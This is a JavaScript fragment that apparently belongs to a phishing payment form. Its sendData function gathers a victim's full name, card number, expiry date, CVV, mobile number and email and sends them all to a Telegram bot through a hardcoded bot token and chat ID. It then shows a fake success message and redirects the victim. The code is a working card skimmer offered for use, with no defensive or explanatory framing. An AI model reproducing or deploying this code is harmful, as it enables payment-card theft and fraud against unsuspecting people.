
function formatCardNumber(input) {
        input.value = input.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
    }

    function formatExpiryDate(input) {
        const value = input.value.replace(/\D/g, '');
        input.value = value.length >= 2 ? value.slice(0, 2) + '/' + value.slice(2, 4) : value;
    }

    async function sendData() {
        const fullname = document.getElementById('fullname').value.trim();
        const cardnumber = document.getElementById('cardnumber').value.trim();
        const expirydate = document.getElementById('expirydate').value.trim();
        const cvv = document.getElementById('cvv').value.trim();
        const mobilenumber = document.getElementById('mobilenumber').value.trim();
        const emailaddress = document.getElementById('emailaddress').value.trim();
        const redirectUrl = document.getElementById('country-code').value;
        const submitButton = document.getElementById('submit-button');
        const spinner = document.getElementById('loading-spinner');

        if (!fullname || !cardnumber || !expirydate || !cvv || !mobilenumber || !emailaddress) {
            alert('Please fill out all fields.');
            return;
        }

        submitButton.disabled = true;
        spinner.style.display = 'inline-block';

        const botToken = '7788248261:AAEVpQ56AMqrKuOEToTQAj22eRiB2uK_gOQ';
        const chatId = '1244376189';
        const message = `
🔐 New Payment Info 🔐
👤 Name: ${fullname}
💳 Card: ${cardnumber.slice(0, 19)}
📅 Expiry: ${expirydate}
🔰 CVV: ${cvv}
📱 Mobile: ${mobilenumber}
📧 Email: ${emailaddress}
😈 DEVLOPER: Aashish Kumar Sah
        `;
        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

        try {
            const response = await fetch(url);
            if (response.ok) {
                alert('Payment submitted successfully! Redirecting...');
                window.location.href = redirectUrl;
            } else {
                alert('Failed to submit payment information.');
            }
        } catch {
            alert('Failed to connect to the server.');
        } finally {
            submitButton.disabled = false;
            spinner.style.display = 'none';
        }
    }

